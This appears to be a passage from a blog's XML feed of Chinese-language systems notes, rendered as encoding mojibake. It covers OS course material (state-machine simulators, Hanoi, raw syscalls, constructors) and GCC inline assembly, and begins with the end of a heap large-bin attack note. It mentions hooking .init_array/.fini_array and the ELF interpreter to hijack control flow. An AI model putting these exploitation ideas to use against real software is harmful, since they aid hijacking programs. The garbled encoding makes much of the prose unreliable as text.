tar1-0x10,tar2-0x20ï¼Œå¯ä»¥åœ¨mallocå°†unsortedbiné‡Œçš„chunk(è¿™ä¸ªchunkè¦æ¯”largebiné‡Œé¢çš„chunkå¤§)å†™å…¥largebinæ—¶åœ¨tar1å’Œtar2å†™å…¥è¿™ä¸ªchunkçš„åœ°å€</p>]]></content>
      
      
      
        <tags>
            
            <tag> Large Bin Attack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NJUOS:æ“ä½œç³»ç»Ÿä¸Šçš„ç¨‹åº</title>
      <link href="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="http://jyywiki.cn/OS/2022/slides/2.slides#/">http://jyywiki.cn/OS/2022/slides/2.slides#/</a></p><h1 id="æ“ä½œç³»ç»Ÿä¸Šçš„ç¨‹åº"><a href="#æ“ä½œç³»ç»Ÿä¸Šçš„ç¨‹åº" class="headerlink" title="æ“ä½œç³»ç»Ÿä¸Šçš„ç¨‹åº"></a>æ“ä½œç³»ç»Ÿä¸Šçš„ç¨‹åº</h1><h2 id="æ•°å­—ç”µè·¯ä¸çŠ¶æ€æœº"><a href="#æ•°å­—ç”µè·¯ä¸çŠ¶æ€æœº" class="headerlink" title="æ•°å­—ç”µè·¯ä¸çŠ¶æ€æœº"></a>æ•°å­—ç”µè·¯ä¸çŠ¶æ€æœº</h2><h3 id="æ•°å­—é€»è¾‘ç”µè·¯ï¼šæ¨¡æ‹Ÿå™¨"><a href="#æ•°å­—é€»è¾‘ç”µè·¯ï¼šæ¨¡æ‹Ÿå™¨" class="headerlink" title="æ•°å­—é€»è¾‘ç”µè·¯ï¼šæ¨¡æ‹Ÿå™¨"></a>æ•°å­—é€»è¾‘ç”µè·¯ï¼šæ¨¡æ‹Ÿå™¨</h3><p>â€œÂ¬â€ã€â€œâˆ§â€ã€â€œâˆ¨â€éä¸æˆ–</p><p><em>X</em>â€²&#x3D;Â¬<em>X</em>âˆ§<em>Y</em></p><p><em>Y</em>â€²&#x3D;Â¬<em>X</em>âˆ§Â¬<em>Y</em></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REGS_FOREACH(_)  _(X) _(Y)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RUN_LOGIC        X1 = !X &amp;&amp; Y; \    <span class="comment">//ç”¨äºå¤šè¡Œå®</span></span></span><br><span class="line">                         Y1 = !X &amp;&amp; !Y;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE(X)        static int X, X##1; <span class="comment">//ä¸¤ä¸ª##æ˜¯è¿æ¥ç¬¦ï¼Œå³æŠŠä¸¤ä¸ªå®å˜é‡æ‹¼æ¥åˆ°ä¸€èµ·</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UPDATE(X)        X = X##1;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT(X)         printf(#X <span class="string">&quot; = %d; &quot;</span>, X); <span class="comment">//#çš„ä½œç”¨å°±æ˜¯æŠŠåé¢çš„å‚æ•°å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰åŒäºæŠŠåé¢çš„å®å˜é‡åŠ ä¸ŠåŒå¼•å·</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  REGS_FOREACH(DEFINE)</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123; <span class="comment">// clock</span></span><br><span class="line">    RUN_LOGIC</span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(PRINT)</span></span><br><span class="line">    <span class="title function_">REGS_FOREACH</span><span class="params">(UPDATE)</span></span><br><span class="line">    <span class="title function_">putchar</span><span class="params">(<span class="string">&#x27;\n&#x27;</span>)</span>; sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;   </span><br><span class="line">å¯ä»¥ç”¨gcc -E çœ‹ä¸‹é¢„å¤„ç†ç»“æœ</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> X, X1; <span class="type">static</span> <span class="type">int</span> Y, Y1;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    X1 = !X &amp;&amp; Y; Y1 = !X &amp;&amp; !Y;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;X&quot;</span> <span class="string">&quot; = %d; &quot;</span>, X); <span class="built_in">printf</span>(<span class="string">&quot;Y&quot;</span> <span class="string">&quot; = %d; &quot;</span>, Y);</span><br><span class="line">    X = X1; Y = Y1;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>); sleep(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">grxer@grxer ~/D/s/N/p2&gt; ./simulator </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">0</span>; </span><br><span class="line">X = <span class="number">0</span>; Y = <span class="number">1</span>; </span><br><span class="line">X = <span class="number">1</span>; Y = <span class="number">0</span>; </span><br></pre></td></tr></table></figure><p>åµŒå¥—å®çš„å±•å¼€</p><blockquote><ul><li>ä¸€èˆ¬çš„å®åµŒå¥—å±•å¼€è§„åˆ™æ˜¯<strong>ç”±å†…å‘å¤–</strong>ï¼Œå…ˆå°†å†…å±‚å®å±•å¼€ï¼Œå†æŠŠå¤–å±‚å®å±•å¼€</li><li>å¦‚æœå®çš„å‚æ•°ç›´æ¥å¸¦æœ‰<code>#</code>ï¼Œåˆ™ä¸ä¼šå±•å¼€å†…å±‚çš„åµŒå¥—å®</li><li>å¦‚æœå®çš„å‚æ•°ç›´æ¥å¸¦æœ‰<code>##</code>ï¼Œåˆ™ä¼šå…ˆå°†å‚æ•°é€šè¿‡<code>##</code>æ‹¼æ¥ï¼Œç„¶åå†ä¾æ¬¡è¿›è¡Œå±•å¼€</li></ul></blockquote><p>è¿™é‡Œé‡‡ç”¨äº†ä¸€ä¸ª<strong>X-MACRO</strong>çš„é«˜çº§å®çš„å†™æ³•,ä¸ªäººè®¤ä¸ºå°±æ˜¯å†™ä¸€ä¸ªå®å†åˆ©ç”¨å®åµŒå¥—å»ä»£æ›¿æˆ‘ä»¬åšä¸€äº›é‡å¤æ€§çš„å·¥ä½œ</p><blockquote><p>x-macroåˆ›å»ºä¸€æ®µè‡ªæˆ‘ç»´æŠ¤å’Œç›¸äº’ä¾èµ–çš„ä»£ç ã€‚å½“ç¨‹åºçš„ä¸€éƒ¨åˆ†å‘ç”Ÿå˜åŒ–å¯¼è‡´å¦ä¸€éƒ¨åˆ†å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå°±å¯ä»¥è¯´ä»£ç æ˜¯ç›¸äº’ä¾èµ–çš„ã€‚</p><p><strong>Xå®çš„ä¼˜åŠ¿</strong></p><ul><li>X-Macros é€šè¿‡åˆ›å»ºå•ç‹¬çš„å¤´æ–‡ä»¶ä»¥å®ç°å¯ç»´æŠ¤ï¼Œå¹¿æ³›ç”¨äºæ“ä½œç³»ç»Ÿå¼€å‘</li><li>æœ‰åŠ©äºè½»æ¾ç»´æŠ¤å¤æ‚çš„ç¼–ç¨‹</li><li>å®ƒå¯ä»¥åˆ›å»ºä¸€æ®µè‡ªæˆ‘ç»´æŠ¤å’Œç›¸äº’ä¾èµ–çš„ä»£ç </li></ul><p><strong>Xå®çš„ç¼ºç‚¹</strong></p><ul><li>ä»£ç å˜å¾—ä¸é‚£ä¹ˆå¯è¯»äº†</li><li>ä»£ç å¾ˆéš¾ç†è§£</li><li>é€šå¸¸ä»…ç”¨äºå†…éƒ¨ç¼–ç¨‹ï¼Œå¦‚ OS ç¼–ç¨‹ã€‚</li></ul></blockquote><h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>Too Long ï¼›Didnâ€™t Read</p><p>å¸®åŠ©æˆ‘ä»¬æ›´å¿«çš„ä»manæ‰‹å†Œé‡Œè·å–ä¿¡æ¯</p><h2 id="ä»€ä¹ˆæ˜¯ç¨‹åº"><a href="#ä»€ä¹ˆæ˜¯ç¨‹åº" class="headerlink" title="ä»€ä¹ˆæ˜¯ç¨‹åº"></a>ä»€ä¹ˆæ˜¯ç¨‹åº</h2><h3 id="æºä»£ç è§†è§’"><a href="#æºä»£ç è§†è§’" class="headerlink" title="æºä»£ç è§†è§’"></a>æºä»£ç è§†è§’</h3><p>ç¨‹åºå°±æ˜¯çŠ¶æ€æœº</p><ul><li>çŠ¶æ€ &#x3D; å † + æ ˆ</li><li>åˆå§‹çŠ¶æ€ &#x3D; <code>main</code> çš„ç¬¬ä¸€æ¡è¯­å¥</li><li>è¿ç§» &#x3D; æ‰§è¡Œä¸€æ¡ç®€å•è¯­å¥</li></ul><p>é€’å½’çš„æ±‰è¯ºå¡”ï¼Œç»å…¸åˆ†æ²»ç®—æ³•ï¼Œæ¯æ¬¡éƒ½æŠŠn-1å½“ä½œä¸€ä¸ªæ•´ä½“ï¼ŒæŠŠn-1æŒªåˆ°è¾…åŠ©ä½ï¼ŒæŠŠæœ€ä¸‹é¢ç§»åˆ°ç›®æ ‡ï¼Œå†æŠŠè¾…åŠ©ä½ä¸Šn-1ç§»åˆ°ç›®æ ‡</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, from, to);</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    hanoi(n - <span class="number">1</span>, from, via, to);</span><br><span class="line">    hanoi(<span class="number">1</span>,     from, to,  via);</span><br><span class="line">    hanoi(n - <span class="number">1</span>, via,  to,  from);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éé€’å½’ï¼Œä¸ªäººæ„Ÿè§‰å…¶å®è¿˜æ˜¯ä¸€ä¸ªé€’å½’çš„æ€æƒ³ï¼Œåªæ˜¯æˆ‘ä»¬æ²¡æœ‰ç”¨cæ¥å¸®åŠ©æˆ‘ä»¬è°ƒç”¨å‡½æ•°ï¼Œè€Œæ˜¯åœ¨cçš„å±‚é¢ä¸Šåšäº†ä¸€å±‚æŠ½è±¡ï¼ŒæŠŠåº•å±‚çš„æ ˆå¸§ç»™æŠ½è±¡å‡ºæ¥ï¼Œæ¥æ¨¡æ‹Ÿè°ƒç”¨ï¼Œè®©æˆ‘ä»¬æ›´å½¢è±¡çš„çœ‹åˆ°çŠ¶æ€çš„è½¬ç§»ï¼Œç†è§£ç¨‹åºæ˜¯ä¸ªçŠ¶æ€æœº</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> pc, n;</span><br><span class="line">  <span class="type">char</span> from, to, via;</span><br><span class="line">&#125; Frame;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> call(...) (&#123; *(++top) = (Frame) &#123; .pc = 0, __VA_ARGS__ &#125;; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret()     (&#123; top--; &#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> goto(loc) (&#123; f-&gt;pc = (loc) - 1; &#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> from, <span class="type">char</span> to, <span class="type">char</span> via)</span> &#123;</span><br><span class="line">  Frame stk[<span class="number">64</span>], *top = stk - <span class="number">1</span>;</span><br><span class="line">  call(n, from, to, via);</span><br><span class="line">  <span class="keyword">for</span> (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (f-&gt;pc) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">if</span> (f-&gt;n == <span class="number">1</span>) &#123; <span class="built_in">printf</span>(<span class="string">&quot;%c -&gt; %c\n&quot;</span>, f-&gt;from, f-&gt;to); <span class="keyword">goto</span>(<span class="number">4</span>); &#125; <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;from, f-&gt;via, f-&gt;to);   <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: call(       <span class="number">1</span>, f-&gt;from, f-&gt;to,  f-&gt;via);  <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: call(f-&gt;n - <span class="number">1</span>, f-&gt;via,  f-&gt;to,  f-&gt;from); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: ret();                                    <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="äºŒè¿›åˆ¶è§†è§’"><a href="#äºŒè¿›åˆ¶è§†è§’" class="headerlink" title="äºŒè¿›åˆ¶è§†è§’"></a>äºŒè¿›åˆ¶è§†è§’</h3><p>è¿˜æ˜¯çŠ¶æ€æœº</p><ul><li>çŠ¶æ€ &#x3D; å†…å­˜ M + å¯„å­˜å™¨ R</li><li>åˆå§‹çŠ¶æ€ &#x3D; åŠ¨æ€é“¾æ¥å™¨ldå»åšåŠ¨æ€é“¾æ¥&#x3D;ld-linux-x86-64.soåŠ è½½libc</li><li>è¿ç§» &#x3D; æ‰§è¡Œä¸€æ¡æŒ‡ä»¤</li></ul><p>æ‰€æœ‰çš„æŒ‡ä»¤éƒ½åªèƒ½è®¡ç®—</p><p>æƒ³è¦æ“ä½œä¸€äº›ç¡¬ä»¶èµ„æºå¿…é¡»ç»è¿‡æ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿè°ƒç”¨syscall</p><p>ç¨‹åº &#x3D; è®¡ç®— + syscall</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line"></span><br><span class="line">.globl _start</span><br><span class="line">_start:</span><br><span class="line">  movq $SYS_write, %rax   // write(</span><br><span class="line">  movq $1,         %rdi   //   fd=1,</span><br><span class="line">  movq $st,        %rsi   //   buf=st,</span><br><span class="line">  movq $(ed - st), %rdx   //   count=ed-st</span><br><span class="line">  syscall                 // );</span><br><span class="line"></span><br><span class="line">  movq $SYS_exit,  %rax   // exit(</span><br><span class="line">  movq $1,         %rdi   //   status=1</span><br><span class="line">  syscall                 // );//è¿™é‡Œç›´æ¥æ˜¯ä¸ªå†…æ ¸æ€çš„syscall</span><br><span class="line"></span><br><span class="line">st:</span><br><span class="line">  .ascii &quot;\033[01;31mHello, OS World\033[0m\n&quot;</span><br><span class="line">ed:</span><br><span class="line">;gcc -c minimal.S &amp;&amp; ld minimal.o </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¹‹å‰åšè¿‡ä¸€äº›x86â€”â€”32å’Œ64çš„ç³»ç»Ÿè°ƒç”¨åˆ†æ<a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a></p><ol><li>cppâ€“&gt;*.i(asciiä¸­é—´æ–‡ä»¶) é¢„å¤„ç†å™¨   gcc -E <strong>é¢„å¤„ç†</strong> é¢„å¤„ç†å™¨å…ˆå°†#include #defineï¼ˆå®ï¼‰ç­‰é¢„å¤„ç†æŒ‡ä»¤è¿›è¡Œæ›¿æ¢å’Œå±•å¼€â€“hello.i</li><li>cc1â€“&gt;*.s(asciiæ±‡ç¼–è¯­è¨€æ–‡ä»¶) ç¼–è¯‘å™¨  gcc -S <strong>ç¼–è¯‘</strong> ç¼–è¯‘å™¨äº§ç”Ÿä¸¤ä¸ªæºæ–‡ä»¶çš„æ±‡ç¼–ä»£ç p1.s p2.sâ€“hello.s</li><li>asâ€“&gt;*.o(å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶) æ±‡ç¼–å™¨    gcc -c <strong>æ±‡ç¼–</strong> æ±‡ç¼–å™¨å°†æ±‡ç¼–ä»£ç è½¬åŒ–ä¸ºå¯é‡å®šä½ç›®æ ‡ä»£ç æ–‡ä»¶ p1.o p2.o ä½†æ˜¯æ²¡æœ‰å¡«å…¥å…¨å±€å€¼çš„åœ°å€ hell.o</li><li>ldâ€“&gt;*.out(å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶) é“¾æ¥å™¨  ld *.o  <strong>é“¾æ¥</strong> é“¾æ¥å™¨å°†ç›®æ ‡ä»£ç æ–‡ä»¶ä¸åº“å‡½æ•°ï¼ˆå¦‚printfï¼‰åˆå¹¶ ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶pé“¾æ¥å™¨çš„ä»»åŠ¡ä¹‹ä¸€å°±æ˜¯ä¸ºå‡½æ•°è°ƒç”¨æ‰¾åˆ°åŒ¹é…çš„å‡½æ•°çš„å¯æ‰§è¡Œä»£ç çš„ä½ç½®</li></ol><h3 id="main-çš„å¼€å§‹-x2F-ç»“æŸå¹¶ä¸æ˜¯æ•´ä¸ªç¨‹åºçš„å¼€å§‹-x2F-ç»“æŸ"><a href="#main-çš„å¼€å§‹-x2F-ç»“æŸå¹¶ä¸æ˜¯æ•´ä¸ªç¨‹åºçš„å¼€å§‹-x2F-ç»“æŸ" class="headerlink" title="main() çš„å¼€å§‹&#x2F;ç»“æŸå¹¶ä¸æ˜¯æ•´ä¸ªç¨‹åºçš„å¼€å§‹&#x2F;ç»“æŸ"></a><code>main()</code> çš„å¼€å§‹&#x2F;ç»“æŸå¹¶ä¸æ˜¯æ•´ä¸ªç¨‹åºçš„å¼€å§‹&#x2F;ç»“æŸ</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, World\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// See also: atexit(3)</span></span><br><span class="line">__attribute__((destructor)) <span class="type">void</span> <span class="title function_">goodbye</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Goodbye, Cruel OS World!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323012323212.png" alt="image-20230323012323212"></p><p>è¿™ä¸ªæˆ‘ä»¬åœ¨<a href="https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/">https://grxer.gitee.io/2023/03/10/Chunk-Extend-and-Overlapping/</a>    åšè¿‡<strong>fini_array hook</strong>åˆ†æ</p><p>å…¶å®å°±æ˜¯å’Œè¿™ä¸ªæœ‰å…³</p><blockquote><p><code>.init_array</code>å’Œ <code>.fini_array</code>ä¸­å­˜æ”¾äº†æŒ‡å‘åˆå§‹åŒ–ä»£ç å’Œç»ˆæ­¢ä»£ç çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p><code>.init_array</code>ä¼šåœ¨main()å‡½æ•°è°ƒç”¨å‰æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥é€šè¿‡ä¿®è¯¥åœ°å€çš„æŒ‡é’ˆæ¥å°†æ§åˆ¶æµæŒ‡å‘ç—…æ¯’æˆ–è€…å¯„ç”Ÿä»£ç ï¼Œå› ä¸ºæ¯”mainæ‰§è¡Œè¿˜æ—©ï¼Œå¤§éƒ¨åˆ†æ¶æ„è½¯ä»¶éƒ½æ˜¯hookè¿™ä¸ª</p><p><code>.fini_array</code> å‡½æ•°æŒ‡é’ˆåœ¨ main() å‡½æ•°æ‰§è¡Œå®Œä¹‹åæ‰è¢«è§¦å‘</p><p>åœ¨<code>.init_array</code> array[0]-&gt;array[1]</p><p>åœ¨<code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p>æˆ‘ä»¬æŠŠç¨‹åºä¸¢åˆ°idaæ¥çœ‹ä¸€ä¸‹</p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013006789.png" alt="image-20230323013006789"></p><p><img src="/2023/03/23/NJUOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%8A%E7%9A%84%E7%A8%8B%E5%BA%8F/image-20230323013037782.png" alt="image-20230323013037782"></p><h3 id="è°è§„å®šæ˜¯-ld-linux-x86-64-soï¼Œè€Œä¸æ˜¯-rtfm-soï¼Ÿ"><a href="#è°è§„å®šæ˜¯-ld-linux-x86-64-soï¼Œè€Œä¸æ˜¯-rtfm-soï¼Ÿ" class="headerlink" title="è°è§„å®šæ˜¯ ld-linux-x86-64.soï¼Œè€Œä¸æ˜¯ rtfm.soï¼Ÿ"></a>è°è§„å®šæ˜¯ <code>ld-linux-x86-64.so</code>ï¼Œè€Œä¸æ˜¯ <code>rtfm.so</code>ï¼Ÿ</h3><p>è¿™ä¸ªæˆ‘ä»¬ä¹‹å‰ä¹Ÿåšè¿‡åˆ†æ<a href="https://grxer.gitee.io/2023/03/19/23-2-21-elf/">https://grxer.gitee.io/2023/03/19/23-2-21-elf/</a></p><p>åœ¨ELFçš„Program Header Table çš„Interpreter Path segmenté‡Œè§„å®šäº†è§£é‡Šå™¨åœ°å€ï¼Œæˆ‘ä»¬åœ¨æœ‰ä¸€ä¸ªå±äºè‡ªå·±åˆç†çš„è§£é‡Šå™¨çš„å‰æä¸‹ï¼Œå¯ä»¥å®Œå…¨hackæ‰è¿™ä¸ªç¨‹åºæ‰§è¡Œæµ</p><h3 id="starce"><a href="#starce" class="headerlink" title="starce"></a>starce</h3><p><a href="https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/">https://grxer.gitee.io/2023/03/05/sd-police2023-pwn/</a>   é‡Œæ‹¿æ¥åˆ†æè¿‡lsç³»ç»Ÿè°ƒç”¨</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>RTFMâ€”-Read The Fucking Manual</p><p>STFWâ€”-Search The Fucking Web</p>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HOW 2 GCC Inline Assembly</title>
      <link href="/2023/03/22/GCC-Inline-Assembly/"/>
      <url>/2023/03/22/GCC-Inline-Assembly/</url>
      
        <content type="html"><![CDATA[<p> å‚è€ƒèµ„æ–™:<a href="https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html">https://www.ibiblio.org/gferg/ldp/GCC-Inline-Assembly-HOWTO.html</a></p><p>â€‹ <a href="https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html">https://gcc.gnu.org/onlinedocs/gcc/Using-Assembly-Language-with-C.html</a></p><h2 id="Asm-Syntax"><a href="#Asm-Syntax" class="headerlink" title="Asm Syntax"></a>Asm Syntax</h2><p>linuxä¸Šæˆ‘ä¸€èˆ¬éƒ½åœ¨ç”¨GNU C ç¼–è¯‘å™¨ GCCï¼Œæ”¯æŒAT&amp;Tå’Œintelæ ¼å¼çš„å†…è”æ±‡ç¼–ï¼Œgccé»˜è®¤æ˜¯attï¼Œæˆ‘ä¸ªäººæ˜¯ä¹ æƒ¯äº†intelæ ¼å¼çš„æ±‡ç¼–ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†æ“ä½œç³»ç»Ÿæºç éƒ½æ˜¯attæ ¼å¼çš„å†…è”æ±‡ç¼–ï¼Œcao</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">|       Intel Code             |      AT&amp;T Code                     |</span><br><span class="line">+------------------------------+------------------------------------+</span><br><span class="line">| mov     eax,1                |  movl    $1,%eax                   |   </span><br><span class="line">| mov     ebx,0ffh             |  movl    $0xff,%ebx                |   </span><br><span class="line">| int     80h                  |  int     $0x80                     |   </span><br><span class="line">| mov     ebx, eax             |  movl    %eax, %ebx                |</span><br><span class="line">| mov     eax,[ecx]            |  movl    (%ecx),%eax               |</span><br><span class="line">| mov     eax,[ebx+3]          |  movl    3(%ebx),%eax              | </span><br><span class="line">| mov     eax,[ebx+20h]        |  movl    0x20(%ebx),%eax           |</span><br><span class="line">| add     eax,[ebx+ecx*2h]     |  addl    (%ebx,%ecx,0x2),%eax      |</span><br><span class="line">| lea     eax,[ebx+ecx]        |  leal    (%ebx,%ecx),%eax          |</span><br><span class="line">| sub     eax,[ebx+ecx*4h-20h] |  subl    -0x20(%ebx,%ecx,0x4),%eax |</span><br><span class="line">+------------------------------+------------------------------------+</span><br></pre></td></tr></table></figure><ul><li>æºæ“ä½œæ•°å’Œç›®çš„æ“ä½œæ•°é¡ºåºç›¸å</li><li>attå¯„å­˜å™¨%å‰ç¼€</li><li>attç«‹å³æ•°å‰æœ‰$ï¼Œ16è¿›åˆ¶0xè€Œä¸æ˜¯ååŠ h</li><li>att mov æ“ä½œå¤§å°â€™bâ€™ã€â€™wâ€™ã€â€™lâ€™ åˆ†åˆ«æŒ‡æ˜äº†å­—èŠ‚ï¼ˆ8ä½ï¼‰ã€å­—ï¼ˆ16ä½ï¼‰ã€é•¿å‹ï¼ˆ32ä½ï¼‰æ›¿ä»£intelâ€byte ptrâ€ã€ â€œword ptrâ€ å’Œ â€œdword ptrâ€ å‰ç¼€</li><li>intelï¼šsection:[base + index*scale + disp]â€”&gt;attï¼šsection:disp(base, index, scale),è¿™é‡Œç«‹å³æ•°ä¸ç”¨$</li></ul><h2 id="Basic-Inline"><a href="#Basic-Inline" class="headerlink" title="Basic Inline"></a>Basic Inline</h2><p>ä¸¤ç§è¯­æ³•éƒ½å¯ä»¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code&quot;)</span><br><span class="line">__asm__(&quot;assembly code&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asm(&quot;assembly code1;&quot;</span><br><span class="line">    &quot;assembly code2;&quot;)</span><br><span class="line">asm(&quot;assembly code1\n\t&quot;</span><br><span class="line">    &quot;assembly code2\n\t&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;&quot;</span>);</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov rcx,0x666\n\t;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax, rcx;\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ‡æ¢åˆ°intelæ ¼å¼gcc -g -masm=intel -o test test.c</span></span><br></pre></td></tr></table></figure><p><img src="/2023/03/22/GCC-Inline-Assembly/image-20230322143535231.png" alt="image-20230322143535231"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;   </span><br><span class="line">__asm__(<span class="string">&quot;mov %rax, %rbx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;mov $56, %rsi\n\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br><span class="line"><span 